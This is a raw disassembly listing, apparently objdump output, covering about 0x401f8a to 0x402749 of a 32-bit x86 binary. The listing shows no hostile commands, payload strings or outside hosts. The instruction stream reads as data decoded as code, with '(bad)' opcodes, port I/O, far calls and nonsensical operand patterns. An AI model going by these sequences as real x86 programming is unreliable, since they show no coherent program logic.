  401f8a:	retf   
  401f8b:	push   ss
  401f8c:	or     eax,0xac010055
  401f91:	inc    eax
  401f92:	adc    DWORD PTR [eax+0x40c81102],ecx
  401f98:	add    BYTE PTR [edx-0x80],0x70
  401f9c:	adc    dl,BYTE PTR [eax]
  401f9e:	xor    eax,DWORD PTR [ebx+0x280c8662]
  401fa4:	in     al,0x4a
  401fa6:	call   DWORD PTR ds:0x414eac
  401fac:	xor    BYTE PTR [ecx-0x3dfdfe58],ah
  401fb2:	test   BYTE PTR [eax+edi*2-0x7c],al
  401fb6:	xor    al,0x5a
  401fb8:	or     BYTE PTR [edx+0x4400840a],al
  401fbe:	add    ch,dl
  401fc0:	add    eax,0x4420300
  401fc5:	add    BYTE PTR [eax],dl
  401fc7:	or     al,0x0
  401fc9:	or     BYTE PTR [ecx],al
  401fcb:	adc    cl,BYTE PTR [eax]
  401fcd:	and    DWORD PTR [eax+eax*2+0x1e0],eax
  401fd4:	sub    eax,0x52404004
  401fd9:	add    al,0x20
  401fdb:	or     al,al
  401fdd:	nop
  401fde:	add    al,0x40
  401fe0:	add    BYTE PTR [esi],dl
  401fe2:	adc    BYTE PTR [ecx],ah
  401fe4:	inc    eax
  401fe5:	inc    eax
  401fe6:	adc    al,BYTE PTR [edx+0x28408220]
  401fec:	and    BYTE PTR [eax+ebp*1-0x4ff5dff0],al
  401ff3:	add    BYTE PTR [eax],al
  401ff5:	adc    BYTE PTR [edi+0x9],al
  401ff8:	add    BYTE PTR [eax],al
  401ffa:	sbb    BYTE PTR [eax+0x6],al
  401ffd:	add    BYTE PTR [ecx+0x10080a08],al
  402003:	adc    BYTE PTR [ecx-0x68],al
  402006:	inc    esp
  402007:	jae    0x401fc9
  402009:	xor    BYTE PTR ds:0x480c888,bl
  40200f:	cwde   
  402010:	inc    edx
  402011:	add    eax,0x124208ac
  402016:	inc    esp
  402017:	adc    al,0x30
  402019:	add    al,0x0
  40201b:	test   BYTE PTR [eax+0x40802002],cl
  402021:	pusha  
  402022:	inc    esp
  402023:	add    DWORD PTR [esi],eax
  402025:	rcl    BYTE PTR [ecx],0x84
  402028:	push   eax
  402029:	or     BYTE PTR [eax-0x37],al
  40202c:	or     BYTE PTR [ecx],cl
  40202e:	lods   al,BYTE PTR ds:[esi]
  40202f:	pop    es
  402030:	pop    esp
  402031:	inc    esp
  402032:	add    DWORD PTR fs:[eax],0xffffffc4
  402036:	or     BYTE PTR [esp+eax*1+0x11],al
  40203a:	inc    eax
  40203b:	(bad)  
  40203c:	leave  
  40203d:	add    BYTE PTR [edx],dl
  40203f:	sub    BYTE PTR [eax+0x1a],cl
  402042:	lar    eax,WORD PTR [eax+0x57]
  402046:	inc    eax
  402047:	add    DWORD PTR [edx],edx
  402049:	add    BYTE PTR [ecx+0x18b3a000],al
  40204f:	xor    DWORD PTR [eax+eax*1],esp
  402052:	popf   
  402053:	inc    edx
  402054:	add    ch,BYTE PTR [eax+0x3841a09d]
  40205a:	adc    BYTE PTR [esi],0x0
  40205d:	add    ah,dl
  40205f:	add    BYTE PTR [esi+0x2e],0x40
  402063:	adc    al,al
  402065:	add    DWORD PTR [eax],ebp
  402067:	inc    ecx
  402068:	add    DWORD PTR [eax],ecx
  40206a:	or     BYTE PTR [edx],al
  40206c:	adc    DWORD PTR [edx+0x604c8c02],eax
  402072:	inc    ebx
  402073:	mov    BYTE PTR [eax+0x5ce041a8],dl
  402079:	and    BYTE PTR [ebx],al
  40207b:	push   ebp
  40207c:	sbb    BYTE PTR [eax],0x6
  40207f:	pop    eax
  402080:	shl    BYTE PTR [eax+edx*1+0x1],0x82
  402085:	add    al,0xd7
  402087:	adc    BYTE PTR [eax+0x3050a022],0x52
  40208e:	adc    BYTE PTR [edx],dh
  402090:	add    BYTE PTR [ebx],al
  402092:	and    DWORD PTR [eax+ecx*8],eax
  402095:	add    eax,0x98405594
  40209a:	add    ecx,DWORD PTR [ecx-0x7f776fde]
  4020a0:	add    BYTE PTR [eax-0x77b6393a],cl
  4020a6:	or     DWORD PTR [eax-0x7e],eax
  4020a9:	dec    ecx
  4020aa:	sbb    DWORD PTR [eax],esp
  4020ac:	mov    BYTE PTR [edx],dl
  4020ae:	or     al,BYTE PTR [esi]
  4020b0:	add    BYTE PTR [eax+eax*1],al
  4020b3:	inc    esp
  4020b4:	adc    BYTE PTR [edx+0x5c0112],al
  4020ba:	rcl    DWORD PTR [edx-0x5aeed49f],0x80
  4020c1:	ror    al,1
  4020c3:	push   0x20102202
  4020c8:	inc    edi
  4020c9:	jo     0x4020f5
  4020cb:	les    eax,FWORD PTR [ecx+0x1]
  4020ce:	or     ch,BYTE PTR ds:0x1a84a5
  4020d4:	sbb    DWORD PTR [ecx],eax
  4020d6:	sbb    ebx,DWORD PTR [eax]
  4020d8:	mov    es,WORD PTR [eax]
  4020da:	add    al,0x40
  4020dc:	outs   dx,BYTE PTR ds:[esi]
  4020dd:	or     BYTE PTR [eax],ch
  4020df:	(bad)  
  4020e0:	rol    BYTE PTR [ecx],0xb0
  4020e3:	and    dl,bl
  4020e5:	add    DWORD PTR [edx],eax
  4020e7:	inc    eax
  4020e8:	add    DWORD PTR [eax],eax
  4020ea:	add    BYTE PTR [eax-0x7fffefe8],0x10
  4020f1:	inc    ebp
  4020f2:	and    cl,bl
  4020f4:	mov    cl,0x60
  4020f6:	sbb    BYTE PTR [ecx+0x2288a022],0xcc
  4020fd:	mov    al,ds:0x84099
  402102:	inc    eax
  402103:	nop
  402104:	adc    BYTE PTR [eax],dl
  402106:	add    dh,BYTE PTR [eax]
  402108:	adc    al,0x20
  40210a:	nop
  40210b:	adc    BYTE PTR [esi+0x0],dh
  40210e:	or     al,0x0
  402110:	sub    ecx,DWORD PTR [edx]
  402112:	add    BYTE PTR [eax],cl
  402114:	add    al,0xf1
  402116:	or     eax,0x40b4604e
  40211b:	add    cl,0x10
  40211e:	add    BYTE PTR [ebx+0x1218000a],al
  402124:	add    DWORD PTR [ecx],eax
  402126:	dec    eax
  402127:	mov    cl,0x52
  402129:	add    BYTE PTR [eax],0x67
  40212c:	add    al,BYTE PTR [edx-0xfdf7ff2]
  402132:	add    al,0x40
  402134:	sbb    ah,BYTE PTR [eax+0x47244880]
  40213a:	push   esp
  40213b:	or     al,BYTE PTR [ecx+0x14020044]
  402141:	add    BYTE PTR [eax+0x7],ah
  402144:	lods   eax,DWORD PTR ds:[esi]
  402145:	add    BYTE PTR [eax+0x2000c04],ah
  40214b:	dec    eax
  40214c:	repnz adc dl,BYTE PTR [ebx]
  40214f:	and    BYTE PTR [edx+0x50117480],al
  402155:	and    esp,esp
  402157:	inc    eax
  402158:	inc    eax
  402159:	add    DWORD PTR [esi+eax*1],esp
  40215c:	add    BYTE PTR [eax+0x20],ah
  40215f:	add    BYTE PTR [ecx+0x18],al
  402162:	add    ah,BYTE PTR [eax+0xe]
  402165:	push   eax
  402166:	dec    eax
  402167:	adc    BYTE PTR [ebx],al
  402169:	or     dl,BYTE PTR [esi]
  40216b:	add    ah,BYTE PTR [eax+0x181a1012]
  402171:	add    dl,BYTE PTR [eax+0x40008980]
  402177:	inc    ecx
  402178:	dec    eax
  402179:	add    al,BYTE PTR [ecx]
  40217b:	add    BYTE PTR [ebp-0x4c],dh
  40217e:	adc    BYTE PTR [esp+eax*1],al
  402181:	and    eax,0x604011
  402186:	inc    eax
  402187:	adc    al,0x4
  402189:	sub    BYTE PTR [ecx],cl
  40218b:	dec    edx
  40218c:	add    BYTE PTR [eax-0x80],al
  40218f:	add    al,BYTE PTR [eax]
  402191:	push   eax
  402192:	add    al,al
  402194:	inc    eax
  402195:	add    al,0xc0
  402197:	push   eax
  402198:	inc    edx
  402199:	adc    al,0x81
  40219b:	push   eax
  40219c:	add    al,0x15
  40219e:	test   BYTE PTR [eax+0x3c],dl
  4021a1:	or     al,0x2a
  4021a3:	adc    eax,0x2200320a
  4021a8:	and    ecx,eax
  4021aa:	or     al,0x12
  4021ac:	or     al,0x0
  4021ae:	add    BYTE PTR [ebx],al
  4021b0:	add    al,BYTE PTR [eax+0x6]
  4021b3:	add    al,BYTE PTR [eax]
  4021b5:	xor    al,0x2
  4021b7:	xor    eax,0x50809701
  4021bc:	and    eax,0x1b00
  4021c1:	sub    BYTE PTR [eax],ah
  4021c3:	add    DWORD PTR [ecx+0x212a00a2],eax
  4021c9:	add    dl,BYTE PTR [eax]
  4021cb:	push   ss
  4021cc:	pusha  
  4021cd:	sbb    DWORD PTR [ebp+0x24],ebp
  4021d0:	and    BYTE PTR ds:0x10000058,ah
  4021d6:	and    cl,BYTE PTR ds:0x20600c2
  4021dc:	and    BYTE PTR [eax],ah
  4021de:	inc    edx
  4021df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4021e0:	cwde   
  4021e1:	dec    edx
  4021e2:	push   esi
  4021e3:	push   edi
  4021e4:	mov    eax,ds:0x90020019
  4021e9:	rol    BYTE PTR [ecx+ecx*1],0x38
  4021ed:	dec    edx
  4021ee:	and    DWORD PTR [ecx],eax
  4021f0:	and    al,BYTE PTR [ecx]
  4021f2:	inc    ax
  4021f4:	adc    BYTE PTR [edx],ah
  4021f6:	pop    eax
  4021f7:	ror    BYTE PTR [edx],0x9
  4021fa:	adc    BYTE PTR [ecx],al
  4021fc:	or     DWORD PTR [ecx+0x81d928],eax
  402202:	and    BYTE PTR [edx],al
  402204:	add    al,0x90
  402206:	add    BYTE PTR [eax],ch
  402208:	add    esp,DWORD PTR [eax+0x47]
  40220b:	rol    BYTE PTR [eax-0x7bbb7fff],cl
  402211:	and    al,0x14
  402213:	adc    BYTE PTR [ecx],al
  402215:	mov    DWORD PTR [eax],eax
  402217:	add    cl,bl
  402219:	add    eax,DWORD PTR [eax]
  40221b:	xor    ah,BYTE PTR [eax-0x40]
  40221e:	push   edx
  40221f:	add    BYTE PTR [ebx-0x56],al
  402222:	sbb    eax,0x160801f0
  402227:	or     BYTE PTR [edx],dl
  402229:	adc    BYTE PTR [edi],0x21
  40222c:	or     BYTE PTR ds:0xc0d10b12,ah
  402232:	add    BYTE PTR [esi],al
  402234:	adc    al,0x20
  402236:	add    BYTE PTR [ecx],0x0
  402239:	adc    BYTE PTR [ecx-0x7bfb6ff4],cl
  40223f:	add    eax,0x39a04021
  402244:	push   ebp
  402245:	rol    BYTE PTR [esp+ebp*1],cl
  402248:	inc    esp
  402249:	pushf  
  40224a:	add    al,0x91
  40224c:	add    BYTE PTR [ecx],0xf5
  40224f:	xor    BYTE PTR [eax+0x12],al
  402252:	or     ch,BYTE PTR [eax]
  402254:	inc    eax
  402255:	add    BYTE PTR [eax],0x48
  402258:	push   es
  402259:	add    esi,DWORD PTR [eax]
  40225b:	push   ebp
  40225c:	nop
  40225d:	mov    eax,0x8026004
  402262:	and    cl,BYTE PTR [eax]
  402264:	or     al,0x6
  402266:	add    BYTE PTR [edx+eiz*1],al
  402269:	or     DWORD PTR [ecx],eax
  40226b:	nop
  40226c:	push   ss
  40226d:	add    BYTE PTR [edx+eax*2],bl
  402270:	inc    ebp
  402271:	inc    eax
  402272:	or     edx,DWORD PTR [eax+0x1101]
  402278:	mov    ds:0x5025023,al
  40227d:	or     BYTE PTR [ecx+0xc00c66],al
  402283:	push   ebx
  402284:	add    BYTE PTR [eax],bl
  402286:	adc    BYTE PTR [edx+eax*1],al
  402289:	and    BYTE PTR [edx+0xb],dl
  40228c:	rcl    DWORD PTR [eax+0x8],1
  40228f:	pop    es
  402290:	sbb    BYTE PTR [eax],ah
  402292:	add    al,0x1
  402294:	add    BYTE PTR [edx],al
  402296:	inc    esp
  402297:	repz arpl WORD PTR [ecx],cx
  40229a:	add    BYTE PTR [eax],0x80
  40229d:	add    BYTE PTR [edx],ah
  40229f:	add    eax,0x50d14504
  4022a4:	mov    WORD PTR [ecx-0x70],es
  4022a7:	adc    BYTE PTR [ecx],ah
  4022a9:	shl    BYTE PTR [edi+0x0],cl
  4022ac:	add    dl,ah
  4022ae:	or     BYTE PTR [edx+eiz*2],ah
  4022b1:	loopne 0x4022c5
  4022b3:	add    al,BYTE PTR [eax]
  4022b5:	add    BYTE PTR [eax],al
  4022b7:	sbb    BYTE PTR [ecx+esi*1],ah
  4022ba:	or     al,BYTE PTR [eax]
  4022bc:	ret    
  4022bd:	add    BYTE PTR [eax+eax*1],al
  4022c0:	mov    BYTE PTR [eax],dh
  4022c2:	and    eax,DWORD PTR [eax]
  4022c4:	mov    BYTE PTR [ecx+eax*8],cl
  4022c7:	add    al,0xb4
  4022c9:	dec    esi
  4022ca:	add    BYTE PTR [ebp+0x10503800],dh
  4022d0:	mov    BYTE PTR [eax+edx*1+0x604a01],ah
  4022d7:	sub    eax,DWORD PTR [eax+0x20]
  4022da:	ja     0x40230c
  4022dc:	xor    BYTE PTR [ecx],al
  4022de:	sbb    BYTE PTR [eax],al
  4022e0:	adc    BYTE PTR [eax],ch
  4022e2:	pusha  
  4022e3:	inc    eax
  4022e4:	inc    eax
  4022e5:	and    eax,0x1120230
  4022ea:	and    BYTE PTR [eax+edx*1],al
  4022ed:	xchg   esp,eax
  4022ee:	add    BYTE PTR [ecx+eax*2],ch
  4022f1:	rol    DWORD PTR [edx],cl
  4022f3:	and    BYTE PTR [eax-0x80],dl
  4022f6:	adc    BYTE PTR [ebx+eiz*4+0x81106],al
  4022fd:	xchg   ecx,eax
  4022fe:	pop    eax
  4022ff:	add    BYTE PTR [eax],dl
  402301:	nop
  402302:	sbb    eax,0x217c880
  402307:	and    BYTE PTR [ecx],al
  402309:	and    BYTE PTR [eax],0xb4
  40230c:	pop    edx
  40230d:	adc    eax,0x8410114
  402312:	xchg   DWORD PTR [eax],ecx
  402314:	sub    al,0x8
  402316:	adc    BYTE PTR [edx],al
  402318:	and    BYTE PTR [eax],ah
  40231a:	(bad)
  40231d:	add    DWORD PTR [eax],0xc01110b8
  402323:	and    BYTE PTR [esp+eax*2],cl
  402326:	adc    BYTE PTR [eax-0x80],cl
  402329:	fadd   DWORD PTR [eax+0x0]
  40232c:	add    BYTE PTR [edx],dl
  40232e:	add    BYTE PTR [edx-0x78],0x10
  402332:	or     BYTE PTR [eax+0x10041000],cl
  402338:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402339:	mov    BYTE PTR [esi],cl
  40233b:	call   0x200:0x20dc2000
  402342:	mov    ds:0x25a601,al
  402347:	add    bl,BYTE PTR [eax]
  402349:	adc    bl,BYTE PTR [edx]
  40234b:	aaa    
  40234c:	adc    BYTE PTR [eax+0x52401e6c],dl
  402352:	or     esi,DWORD PTR [edx]
  402354:	adc    al,BYTE PTR [eax]
  402356:	xor    BYTE PTR [eax],ah
  402358:	add    DWORD PTR [ebp+0x1e],eax
  40235b:	rol    BYTE PTR [edx+esi*1+0x18a10040],0x61
  402363:	and    eax,DWORD PTR [ecx-0x66]
  402366:	pusha  
  402367:	shl    DWORD PTR [eax],0x0
  40236a:	add    cl,BYTE PTR [ecx]
  40236c:	cdq    
  40236d:	or     BYTE PTR [ecx-0x3bbfefe5],bl
  402373:	cwde   
  402374:	ins    BYTE PTR es:[edi],dx
  402375:	adc    BYTE PTR [eax+esi*8],dh
  402378:	and    al,al
  40237a:	adc    BYTE PTR [edx],0x84
  40237d:	and    al,0x53
  40237f:	ficom  DWORD PTR [eax]
  402381:	mov    al,ds:0x80015010
  402386:	nop
  402387:	adc    dh,BYTE PTR [edx]
  402389:	push   eax
  40238a:	adc    dl,al
  40238c:	popa   
  40238d:	adc    DWORD PTR [esi],ecx
  40238f:	bound  edx,QWORD PTR [ebx+eiz*2]
  402392:	add    DWORD PTR [eax+0x44],eax
  402395:	add    BYTE PTR [edx+0x48],al
  402398:	add    DWORD PTR [ecx],ebp
  40239a:	add    al,BYTE PTR [edx+ebp*1+0x1818200]
  4023a1:	add    BYTE PTR [eax],al
  4023a3:	or     BYTE PTR [eax+0x400a8530],dl
  4023a9:	add    BYTE PTR [eax+eax*1],0x5
  4023ad:	xchg   ebx,eax
  4023ae:	xor    dh,BYTE PTR [eax]
  4023b0:	and    BYTE PTR [eax],bl
  4023b2:	adc    DWORD PTR [edx],esp
  4023b4:	mov    BYTE PTR [ecx],ah
  4023b6:	mov    BYTE PTR [esi-0x61],0xd5
  4023ba:	add    al,0x5
  4023bc:	add    al,0x3
  4023be:	pop    es
  4023bf:	inc    eax
  4023c0:	ret    0xa68
  4023c3:	adc    BYTE PTR [eax],0x18
  4023c6:	add    al,BYTE PTR [esi+0x2e]
  4023c9:	add    DWORD PTR [ecx],ebx
  4023cb:	nop
  4023cc:	dec    esp
  4023cd:	inc    esp
  4023ce:	dec    ebp
  4023cf:	push   esp
  4023d0:	add    al,0x0
  4023d2:	mov    al,0x2
  4023d4:	adc    DWORD PTR [edx-0x5fc6f000],esp
  4023da:	adc    eax,0x41000c64
  4023df:	mov    BYTE PTR [edx-0x66],al
  4023e2:	xor    al,0x2d
  4023e4:	mov    dl,0x90
  4023e6:	add    dl,BYTE PTR [eax]
  4023e8:	adc    BYTE PTR [esi],ah
  4023ea:	and    BYTE PTR [eax],al
  4023ec:	dec    ebx
  4023ed:	add    ah,al
  4023ef:	mov    dl,BYTE PTR [edx]
  4023f1:	add    DWORD PTR [eax],ecx
  4023f3:	or     BYTE PTR [eax],dl
  4023f5:	inc    eax
  4023f6:	add    edx,DWORD PTR [eax-0x58eddf00]
  4023fc:	pusha  
  4023fd:	and    al,0x0
  4023ff:	call   0x20556a54
  402404:	inc    eax
  402405:	lds    eax,FWORD PTR [edx]
  402407:	or     BYTE PTR [eax+0xe418040],al
  40240d:	adc    DWORD PTR [ecx+0x48],eax
  402410:	add    BYTE PTR [eax],ch
  402412:	mov    ecx,DWORD PTR [eax]
  402414:	xor    ebp,esp
  402416:	add    BYTE PTR [esi-0x7e],al
  402419:	mov    al,0x40
  40241b:	push   eax
  40241c:	add    BYTE PTR [ecx],dl
  40241e:	or     BYTE PTR [ecx+0x2420110],ah
  402424:	add    al,ah
  402426:	pop    eax
  402427:	and    eax,DWORD PTR [eax]
  402429:	adc    eax,DWORD PTR [ecx+0x444045]
  40242f:	add    BYTE PTR [eax+0x7],dl
  402432:	sub    dl,BYTE PTR [esi+0x2054151c]
  402438:	or     BYTE PTR [ebx+0x65004842],dl
  40243e:	inc    edx
  40243f:	pop    edx
  402440:	sbb    BYTE PTR [ecx],al
  402442:	inc    ecx
  402443:	lds    esp,FWORD PTR [eax+0x2228230]
  402449:	inc    eax
  40244a:	adc    BYTE PTR [eax],dh
  40244c:	add    BYTE PTR [eax],al
  40244e:	or     BYTE PTR [eax],0x8
  402451:	mov    eax,DWORD PTR [ebp+ebx*1+0x5]
  402455:	pop    es
  402456:	or     DWORD PTR [eax],edx
  402458:	cmp    BYTE PTR [eax],al
  40245a:	adc    BYTE PTR [eax+0x41696709],al
  402460:	mov    esp,eax
  402462:	dec    ecx
  402463:	mov    eax,ds:0x40818c2
  402468:	(bad)  
  402469:	adc    al,0x3
  40246b:	add    DWORD PTR [eax],eax
  40246d:	or     BYTE PTR [eax+0x60401009],bl
  402473:	xor    eax,0x88000f11
  402478:	and    edx,DWORD PTR [eax]
  40247a:	pusha  
  40247b:	inc    eax
  40247c:	adc    DWORD PTR [eax],esp
  40247e:	sbb    BYTE PTR [eax],dl
  402480:	dec    eax
  402481:	adc    al,0x8
  402483:	and    eax,0xa0140042
  402488:	or     al,0x4
  40248a:	add    al,0x0
  40248c:	adc    BYTE PTR [eax+0x12222044],ah
  402492:	rol    dl,1
  402494:	add    BYTE PTR [ecx],0x82
  402497:	add    BYTE PTR [eax+0x40],0x18
  40249b:	cwde   
  40249c:	or     DWORD PTR [eax+0x14],esi
  40249f:	add    al,0xc9
  4024a1:	or     BYTE PTR [edx],dh
  4024a3:	cmp    ah,BYTE PTR [eax+0x19442c00]
  4024a9:	pop    eax
  4024aa:	and    al,al
  4024ac:	add    DWORD PTR [eax-0x7fb6cbef],ecx
  4024b2:	inc    edx
  4024b3:	add    al,BYTE PTR [eax+eax*1]
  4024b6:	add    al,0x29
  4024b8:	xor    al,0x12
  4024ba:	add    BYTE PTR ds:0x2920e50,ch
  4024c0:	nop
  4024c1:	jmp    0xc418:0xc0080420
  4024c8:	and    BYTE PTR [ecx-0x1a],cl
  4024cb:	lea    eax,[eax]
  4024cd:	mov    es,WORD PTR [esp+0x20]
  4024d1:	adc    BYTE PTR [ecx],cl
  4024d3:	inc    ecx
  4024d4:	xor    BYTE PTR [ebx],0x9
  4024d7:	pusha  
  4024d8:	and    ebp,eax
  4024da:	add    BYTE PTR [edx],al
  4024dc:	and    al,0x8
  4024de:	and    BYTE PTR [eax],cl
  4024e0:	push   esp
  4024e1:	or     BYTE PTR [eax-0x6fbf8fef],cl
  4024e7:	add    BYTE PTR [esi+0x18108026],ah
  4024ed:	and    al,0x65
  4024ef:	nop
  4024f0:	and    eax,DWORD PTR [eax+0x46]
  4024f3:	add    BYTE PTR [eax-0x7c],bl
  4024f6:	and    al,BYTE PTR [eax+eiz*1]
  4024f9:	xor    ah,BYTE PTR [eax]
  4024fb:	add    BYTE PTR [eax],al
  4024fd:	add    BYTE PTR [eax+0x18],ah
  402500:	rol    BYTE PTR [eax+0x5],0xa
  402504:	sbb    BYTE PTR [ecx],al
  402506:	mov    al,ds:0x3c120a40
  40250b:	and    BYTE PTR [edi+0x4],0xa
  40250f:	and    BYTE PTR [ecx],al
  402511:	enter  0xc08a,0x4b
  402515:	add    BYTE PTR [eax+esi*2+0x50602414],bl
  40251c:	dec    eax
  40251d:	or     BYTE PTR [eax],dl
  40251f:	add    eax,0x120070a1
  402524:	or     eax,DWORD PTR [ecx+0x21]
  402527:	adc    dh,BYTE PTR [eax]
  402529:	shl    BYTE PTR ds:0x58202063,0x84
  402530:	inc    esp
  402531:	nop
  402532:	add    dl,BYTE PTR [eax+0xe]
  402535:	dec    eax
  402536:	inc    eax
  402537:	cmp    dl,BYTE PTR [edx+0x814221c]
  40253d:	cmp    al,0x15
  40253f:	add    DWORD PTR [ecx+eax*4+0x20],eax
  402543:	mov    WORD PTR [ebx],es
  402545:	add    eax,DWORD PTR [edi]
  402547:	or     BYTE PTR [edx],al
  402549:	sbb    BYTE PTR ds:0x1000066,al
  40254f:	fs push eax
  402551:	or     BYTE PTR [eax],al
  402553:	adc    ah,BYTE PTR [ecx]
  402555:	cmp    DWORD PTR [eax],eax
  402557:	rol    BYTE PTR [eax+0x2223e060],cl
  40255d:	test   DWORD PTR [eax+0x10],eax
  402560:	adc    al,BYTE PTR [edx-0x79]
  402563:	or     BYTE PTR [esi],ch
  402565:	inc    eax
  402566:	add    DWORD PTR [eax],edx
  402568:	and    ecx,eax
  40256a:	loope  0x402581
  40256c:	inc    edx
  40256d:	add    al,0x70
  40256f:	push   eax
  402570:	add    BYTE PTR [eax+0x5],cl
  402573:	shl    DWORD PTR [ebp-0x67778000],0xac
  40257a:	test   BYTE PTR [eax+eiz*2],ch
  40257d:	bound  eax,QWORD PTR [ecx]
  40257f:	test   BYTE PTR [ebx],dl
  402581:	sub    eax,DWORD PTR [esi+0x2222804]
  402587:	popa   
  402588:	add    DWORD PTR [eax*4-0x57daedc0],0x1250010a
  402593:	adc    cl,BYTE PTR [eax]
  402595:	cwde   
  402596:	add    ah,BYTE PTR [eax]
  402598:	(bad)  
  402599:	and    al,0x9
  40259b:	out    0x82,eax
  40259d:	or     BYTE PTR [eax+ecx*1+0x60200213],ah
  4025a4:	sbb    BYTE PTR [edi],al
  4025a6:	enter  0x680,0x58
  4025aa:	and    BYTE PTR [edx+0x841003],cl
  4025b0:	retf   0x85
  4025b3:	sub    DWORD PTR [esp+eax*4],ecx
  4025b6:	dec    esp
  4025b7:	add    BYTE PTR [esi+eax*1],al
  4025ba:	add    BYTE PTR [eax],0x91
  4025bd:	or     BYTE PTR [ecx+0x1010660c],0x8
  4025c4:	nop
  4025c5:	rcl    BYTE PTR [edx+0x40],0x9
  4025c9:	add    dl,BYTE PTR [eax]
  4025cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4025cc:	or     BYTE PTR [eax+ecx*1],ah
  4025cf:	adc    BYTE PTR [eax],al
  4025d1:	pusha  
  4025d2:	or     BYTE PTR [ecx],ah
  4025d4:	adc    al,0x12
  4025d6:	or     eax,0x25652b4
  4025db:	add    DWORD PTR [eax],eax
  4025dd:	lods   al,BYTE PTR ds:[esi]
  4025de:	or     BYTE PTR [ebx+0x0],ah
  4025e1:	adc    DWORD PTR [ebp-0x1f],ebx
  4025e4:	add    eax,0x85e06080
  4025e9:	or     al,0x20
  4025eb:	add    bl,BYTE PTR [ecx]
  4025ed:	cmp    BYTE PTR [eax+0x2],dl
  4025f0:	test   BYTE PTR [eax],al
  4025f2:	and    BYTE PTR [eax+0x1],al
  4025f5:	add    BYTE PTR [edx],0x5
  4025f8:	sub    eax,0x10400110
  4025fd:	sub    BYTE PTR es:[eax+0x5],al
  402601:	test   al,0x8e
  402603:	xchg   ecx,eax
  402604:	add    al,BYTE PTR [eax]
  402606:	movups xmm0,XMMWORD PTR [esi]
  402609:	rcl    BYTE PTR [eax+eax*1+0x9],1
  40260d:	add    eax,0x80608009
  402612:	or     BYTE PTR [esp+eax*2+0x2e],al
  402616:	sub    BYTE PTR [ebp+0x42400006],al
  40261c:	dec    ecx
  40261d:	sbb    DWORD PTR [ebx+eiz*1],esp
  402620:	add    al,0x4
  402622:	add    al,0x28
  402624:	add    edx,DWORD PTR [eax]
  402626:	pop    edx
  402627:	and    BYTE PTR [ebx-0x37bacff6],ah
  40262d:	stos   BYTE PTR es:[edi],al
  40262e:	mov    BYTE PTR [ecx+0x50],al
  402631:	mov    al,BYTE PTR [edx]
  402633:	pusha  
  402634:	mov    BYTE PTR [ecx],cl
  402636:	add    al,0x1
  402638:	es dec esp
  40263a:	retf   0xc65
  40263d:	nop
  40263e:	sub    BYTE PTR [edx],al
  402640:	push   eax
  402641:	pusha  
  402642:	add    al,BYTE PTR [eax]
  402644:	pop    ecx
  402645:	adc    BYTE PTR [eax-0x30],dl
  402648:	add    BYTE PTR [edx+eax*1],al
  40264b:	add    BYTE PTR [eax],0x41
  40264e:	sub    DWORD PTR [eax],ecx
  402650:	or     al,0x0
  402652:	inc    eax
  402653:	add    al,0x40
  402655:	inc    edx
  402656:	or     cl,BYTE PTR [eax+eiz*1]
  402659:	add    eax,0x125b0c2
  40265e:	call   0x55e3aafc
  402663:	add    BYTE PTR [esi],dl
  402665:	add    DWORD PTR [ecx-0x53ff77fd],0x12004020
  40266f:	es dec edx
  402671:	pop    ss
  402672:	bound  eax,QWORD PTR [edx-0x77ffdf10]
  402678:	and    DWORD PTR [eax],edx
  40267a:	and    BYTE PTR [eax+ecx*1-0x66],al
  40267e:	add    dl,BYTE PTR [eax]
  402680:	and    BYTE PTR [esi],bl
  402682:	add    al,0x40
  402684:	test   DWORD PTR gs:[eax+0xe48011],edx
  40268b:	sub    BYTE PTR [esi+0x0],ch
  40268e:	mov    al,BYTE PTR [eax-0x736f53ff]
  402694:	and    al,BYTE PTR [eax+0x8]
  402697:	mov    al,ds:0x6140342
  40269c:	or     BYTE PTR [edx],dl
  40269e:	add    al,dl
  4026a0:	dec    ecx
  4026a1:	sbb    cl,BYTE PTR [edx]
  4026a3:	push   0x11a35915
  4026a8:	dec    esp
  4026a9:	and    BYTE PTR [edx+0x46],al
  4026ac:	adc    BYTE PTR [eax+ebx*1],dl
  4026af:	nop
  4026b0:	add    eax,0x40e06018
  4026b5:	cmp    BYTE PTR [eax+ecx*4],0x80
  4026b9:	add    dh,BYTE PTR [eax]
  4026bb:	xor    eax,0x25018100
  4026c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4026c1:	test   BYTE PTR [edx+edx*1],cl
  4026c4:	add    eax,DWORD PTR [ecx]
  4026c6:	dec    ebp
  4026c7:	dec    ebp
  4026c8:	or     DWORD PTR [esi+0x2800404],esp
  4026ce:	dec    esp
  4026cf:	add    BYTE PTR [ecx+0x12915050],0x1
  4026d6:	add    eax,0x11201df2
  4026db:	push   es
  4026dc:	or     DWORD PTR [eax],ebx
  4026de:	push   es
  4026df:	popa   
  4026e0:	nop
  4026e1:	inc    edx
  4026e2:	rol    BYTE PTR [eax+edx*2+0x5424b800],1
  4026e9:	rcl    BYTE PTR [eax+0x4],1
  4026ec:	adc    ah,BYTE PTR [eax]
  4026ee:	dec    esp
  4026ef:	adc    BYTE PTR ds:0x5280,al
  4026f5:	cmp    dl,BYTE PTR [eax]
  4026f7:	adc    al,0x43
  4026f9:	sub    BYTE PTR [eax],bl
  4026fb:	xor    BYTE PTR [ecx-0x57],al
  4026fe:	dec    eax
  4026ff:	and    al,0x0
  402701:	push   es
  402702:	adc    DWORD PTR [eax],eax
  402704:	adc    al,BYTE PTR [eax-0x80]
  402707:	nop
  402708:	and    BYTE PTR [eax+0x4809e816],al
  40270e:	dec    esp
  40270f:	rcl    BYTE PTR [eax],cl
  402711:	lods   eax,DWORD PTR ds:[esi]
  402712:	and    DWORD PTR [esi+0x4446081],0xffffff90
  402719:	add    al,0x3
  40271b:	xor    al,0xa
  40271d:	mov    DWORD PTR [eax],esi
  40271f:	pop    ebx
  402720:	popa   
  402721:	adc    DWORD PTR [eax+0x23608016],esp
  402727:	add    cl,BYTE PTR [ebx+0x18144a43]
  40272d:	and    BYTE PTR ds:0x6000168,dl
  402733:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402734:	add    ah,BYTE PTR [ebx]
  402736:	dec    ecx
  402737:	push   eax
  402738:	add    BYTE PTR [edi+0x21869013],al
  40273e:	add    bl,BYTE PTR [eax]
  402740:	and    BYTE PTR [eax+0x64],al
  402743:	and    BYTE PTR [edi+0x23000100],bh
  402749:	adc    al,0x0
